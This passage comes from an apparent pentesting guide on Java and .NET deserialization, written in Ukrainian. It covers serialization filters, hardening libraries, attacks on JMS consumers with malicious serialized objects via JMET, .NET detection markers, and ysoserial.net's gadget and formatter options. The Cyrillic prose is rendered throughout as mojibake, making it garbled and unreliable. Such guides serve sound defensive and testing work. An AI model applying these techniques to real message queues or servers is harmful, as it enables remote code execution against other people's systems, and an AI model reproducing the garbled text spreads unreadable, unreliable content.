**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Java Agent –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏** –ø—Ä–æ–ø–æ–Ω—É—î —Ä–µ–∑–µ—Ä–≤–Ω–µ —Ä—ñ—à–µ–Ω–Ω—è, –∫–æ–ª–∏ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–æ–¥—É –Ω–µ–º–æ–∂–ª–∏–≤–∞. –¶–µ–π –º–µ—Ç–æ–¥ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –¥–ª—è **—á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É —à–∫—ñ–¥–ª–∏–≤–∏—Ö –∫–ª–∞—Å—ñ–≤**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä JVM:
```
-javaagent:name-of-agent.jar
```
–¶–µ –∑–∞–±–µ–∑–ø–µ—á—É—î —Å–ø–æ—Å—ñ–± –¥–∏–Ω–∞–º—ñ—á–Ω–æ –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é, —ñ–¥–µ–∞–ª—å–Ω–æ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –¥–ª—è —Å–µ—Ä–µ–¥–æ–≤–∏—â, –¥–µ –Ω–µ–≥–∞–π–Ω—ñ –∑–º—ñ–Ω–∏ –∫–æ–¥—É —î –Ω–µ–ø—Ä–∞–∫—Ç–∏—á–Ω–∏–º–∏.

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ø—Ä–∏–∫–ª–∞–¥ —É [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**–†–µ–∞–ª—ñ–∑–∞—Ü—ñ—è —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó**: Java 9 –ø—Ä–µ–¥—Å—Ç–∞–≤–∏–ª–∞ —Ñ—ñ–ª—å—Ç—Ä–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å **`ObjectInputFilter`**, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î –ø–æ—Ç—É–∂–Ω–∏–π –º–µ—Ö–∞–Ω—ñ–∑–º –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫—Ä–∏—Ç–µ—Ä—ñ—ó–≤, —è–∫–∏–º –ø–æ–≤–∏–Ω–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –æ–±'—î–∫—Ç–∏ –ø–µ—Ä–µ–¥ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é. –¶—ñ —Ñ—ñ–ª—å—Ç—Ä–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –≥–ª–æ–±–∞–ª—å–Ω–æ –∞–±–æ –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –ø–æ—Ç–æ–∫—É, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –¥–µ—Ç–∞–ª—å–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –ø—Ä–æ—Ü–µ—Å–æ–º –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.

–©–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ—ñ–ª—å—Ç—Ä–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, –≤–∏ –º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≥–ª–æ–±–∞–ª—å–Ω–∏–π —Ñ—ñ–ª—å—Ç—Ä, —è–∫–∏–π –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ –≤—Å—ñ—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, –∞–±–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–∏–Ω–∞–º—ñ—á–Ω–æ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –ø–æ—Ç–æ–∫—ñ–≤. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏**: –ë—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Ç–∞–∫—ñ —è–∫ **NotSoSerial**, **jdeserialize** —Ç–∞ **Kryo**, –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ä–æ–∑—à–∏—Ä–µ–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—é —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó Java. –¶—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –º–æ–∂—É—Ç—å –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Ä—ñ–≤–Ω—ñ –±–µ–∑–ø–µ–∫–∏, —Ç–∞–∫—ñ —è–∫ –±—ñ–ª–∏–π –∞–±–æ —á–æ—Ä–Ω–∏–π —Å–ø–∏—Å–∫–∏ –∫–ª–∞—Å—ñ–≤, –∞–Ω–∞–ª—ñ–∑ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ –ø–µ—Ä–µ–¥ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é —Ç–∞ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—é –≤–ª–∞—Å–Ω–∏—Ö —Å—Ç—Ä–∞—Ç–µ–≥—ñ–π —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.

* **NotSoSerial** –ø–µ—Ä–µ—Ö–æ–ø–ª—é—î –ø—Ä–æ—Ü–µ—Å–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—é –Ω–µ–Ω–∞–¥—ñ–π–Ω–æ–≥–æ –∫–æ–¥—É.
* **jdeserialize** –¥–æ–∑–≤–æ–ª—è—î –∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ Java-–æ–±'—î–∫—Ç–∏ –±–µ–∑ —ó—Ö –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î –≤–∏—è–≤–∏—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —à–∫—ñ–¥–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç.
* **Kryo** —î –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ—é —Ä–∞–º–∫–æ—é —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫–∞ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î —à–≤–∏–¥–∫—ñ—Å—Ç—å —ñ –µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –Ω–∞–ª–∞—à—Ç–æ–≤—É–≤–∞–Ω—ñ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –±–µ–∑–ø–µ–∫—É.

### –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* –î–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è —Ç–∞ –¥–æ–ø–æ–≤—ñ–¥—å ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* –î–æ–ø–æ–≤—ñ–¥—å –ø—Ä–æ gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) —Ç–∞ —Å–ª–∞–π–¥–∏: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* –°—Ç–∞—Ç—Ç—è Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó Java —Ç–∞ .Net JSON **–¥–æ–∫—É–º–µ–Ω—Ç:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** –¥–æ–ø–æ–≤—ñ–¥—å: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) —Ç–∞ —Å–ª–∞–π–¥–∏: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVE –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è, —â–æ —Ç–∞–∫–µ **JNDI Injection, —è–∫ –π–æ–≥–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ RMI, CORBA & LDAP —Ç–∞ —è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ log4shell** (—ñ –ø—Ä–∏–∫–ª–∞–¥ —Ü—ñ—î—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ) –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> API **Java Message Service** (**JMS**) —î Java API –¥–ª—è –æ–±–º—ñ–Ω—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º–∏, –æ—Ä—ñ—î–Ω—Ç–æ–≤–∞–Ω–∏–º –Ω–∞ –ø–æ—Å–ª—É–≥–∏, –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –º—ñ–∂ –¥–≤–æ–º–∞ –∞–±–æ –±—ñ–ª—å—à–µ –∫–ª—ñ—î–Ω—Ç–∞–º–∏. –¶–µ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—è –¥–ª—è –≤–∏—Ä—ñ—à–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º–∏ –≤–∏—Ä–æ–±–Ω–∏–∫–∞-—Å–ø–æ–∂–∏–≤–∞—á–∞. JMS —î —á–∞—Å—Ç–∏–Ω–æ—é Java Platform, Enterprise Edition (Java EE) —ñ –±—É–ª–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–∞ —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—î—é, —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–æ—é –≤ Sun Microsystems, –∞–ª–µ –∑ —Ç–∏—Ö –ø—ñ—Ä –∫–µ—Ä—É—î—Ç—å—Å—è Java Community Process. –¶–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç –æ–±–º—ñ–Ω—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º–∏, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º –¥–æ–¥–∞—Ç–∫—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ Java EE —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏, –Ω–∞–¥—Å–∏–ª–∞—Ç–∏, –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —Ç–∞ —á–∏—Ç–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–≤'—è–∑–∫—É –º—ñ–∂ —Ä—ñ–∑–Ω–∏–º–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏ —Ä–æ–∑–ø–æ–¥—ñ–ª–µ–Ω–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É –±—É—Ç–∏ —Å–ª–∞–±–æ –ø–æ–≤'—è–∑–∞–Ω–∏–º, –Ω–∞–¥—ñ–π–Ω–∏–º —ñ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∏–º. (–ó [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### –ü—Ä–æ–¥—É–∫—Ç–∏

–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ –ø—Ä–æ–¥—É–∫—Ç—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–û—Ç–∂–µ, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —î **–±–µ–∑–ª—ñ—á —Å–µ—Ä–≤—ñ—Å—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å JMS –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–º —á–∏–Ω–æ–º**. –¢–æ–º—É, —è–∫—â–æ —É –≤–∞—Å —î **–¥–æ—Å—Ç–∞—Ç–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó** –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Ü–∏–º —Å–µ—Ä–≤—ñ—Å–∞–º (–∑–∞–∑–≤–∏—á–∞–π –≤–∞–º –∑–Ω–∞–¥–æ–±–ª—è—Ç—å—Å—è –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ), –≤–∏ –∑–º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ **—à–∫—ñ–¥–ª–∏–≤—ñ –æ–±'—î–∫—Ç–∏, —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ, —è–∫—ñ –±—É–¥—É—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ —Å–ø–æ–∂–∏–≤–∞—á–µ–º/–ø—ñ–¥–ø–∏—Å–Ω–∏–∫–æ–º**.\
–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤ —Ü—ñ–π –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Å—ñ **–∫–ª—ñ—î–Ω—Ç–∏, —è–∫—ñ –±—É–¥—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –∑–∞—Ä–∞–∑—è—Ç—å—Å—è**.

–í–∞–º —Å–ª—ñ–¥ –ø–∞–º'—è—Ç–∞—Ç–∏, —â–æ –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Å–µ—Ä–≤—ñ—Å –≤—Ä–∞–∑–ª–∏–≤–∏–π (–æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –Ω–µ–±–µ–∑–ø–µ—á–Ω–æ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞), –≤–∞–º –≤—Å–µ —â–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [JMET](https://github.com/matthiaskaiser/jmet) –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –¥–ª—è **–ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ç–∞ –∞—Ç–∞–∫–∏ –Ω–∞ —Ü—ñ —Å–µ—Ä–≤—ñ—Å–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –∫—ñ–ª—å–∫–∞ —à–∫—ñ–¥–ª–∏–≤–∏—Ö –æ–±'—î–∫—Ç—ñ–≤, —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—ñ–¥–æ–º–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤**. –¶—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º—É—Ç—å, —è–∫—â–æ —Å–µ—Ä–≤—ñ—Å –≤—Å–µ —â–µ –≤—Ä–∞–∑–ª–∏–≤–∏–π —ñ —è–∫—â–æ –±—É–¥—å-—è–∫–∏–π –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É.

### –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* –î–æ–ø–æ–≤—ñ–¥—å JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* –°–ª–∞–π–¥–∏: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

–£ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ .Net –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –ø—Ä–∞—Ü—é—é—Ç—å –ø–æ–¥—ñ–±–Ω–æ –¥–æ —Ç–∏—Ö, —â–æ –∑—É—Å—Ç—Ä—ñ—á–∞—é—Ç—å—Å—è –≤ Java, –¥–µ –≥–∞–¥–∂–µ—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å—Å—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–æ–¥—É –ø—ñ–¥ —á–∞—Å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –æ–±'—î–∫—Ç–∞.

### –í—ñ–¥–±–∏—Ç–æ–∫

#### WhiteBox

–î–∂–µ—Ä–µ–ª—å–Ω–∏–π –∫–æ–¥ —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

–û—Å–Ω–æ–≤–Ω–∞ —É–≤–∞–≥–∞ –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –∑–æ—Å–µ—Ä–µ–¥–∂–µ–Ω–∞ –Ω–∞ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ç–æ—Ä–∞—Ö, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —Ç–∏–ø –∑–∞ –∑–º—ñ–Ω–Ω–æ—é –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

#### BlackBox

–ü–æ—à—É–∫ —Å–ª—ñ–¥ –Ω–∞—Ü—ñ–ª–∏—Ç–∏ –Ω–∞ —Ä—è–¥–æ–∫, –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–π —É Base64 **AAEAAAD/////** –∞–±–æ –±—É–¥—å-—è–∫–∏–π –ø–æ–¥—ñ–±–Ω–∏–π —à–∞–±–ª–æ–Ω, —è–∫–∏–π –º–æ–∂–µ –ø—ñ–¥–ª—è–≥–∞—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, –Ω–∞–¥–∞—é—á–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Ç–∏–ø–æ–º, —â–æ –ø—ñ–¥–ª—è–≥–∞—î –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –¶–µ –º–æ–∂–µ –≤–∫–ª—é—á–∞—Ç–∏, –∞–ª–µ –Ω–µ –æ–±–º–µ–∂—É—î—Ç—å—Å—è, **JSON** –∞–±–æ **XML** —Å—Ç—Ä—É–∫—Ç—É—Ä–∞–º–∏ –∑ `TypeObject` –∞–±–æ `$type`.

### ysoserial.net

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó**. –ü—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é git –≤–∞–º —Å–ª—ñ–¥ **—Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Visual Studio, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥.

–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, **—è–∫ ysoserial.net —Å—Ç–≤–æ—Ä—é—î —Å–≤—ñ–π –µ–∫—Å–ø–ª–æ–π—Ç**, –≤–∏ –º–æ–∂–µ—Ç–µ [**–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É, –¥–µ –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è –≥–∞–¥–∂–µ—Ç ObjectDataProvider + ExpandedWrapper + Json.Net —Ñ–æ—Ä–º–∞—Ç–µ—Ä**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

–û—Å–Ω–æ–≤–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ **ysoserial.net**: **`--gadget`**, **`--formatter`**, **`--output`** —Ç–∞ **`--plugin`.**

* **`--gadget`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ –≥–∞–¥–∂–µ—Ç–∞, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ (–≤–∫–∞–∑–∞—Ç–∏ –∫–ª–∞—Å/—Ñ—É–Ω–∫—Ü—ñ—é, —è–∫–∞ –±—É–¥–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏—Å—è –ø—ñ–¥ —á–∞—Å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥).
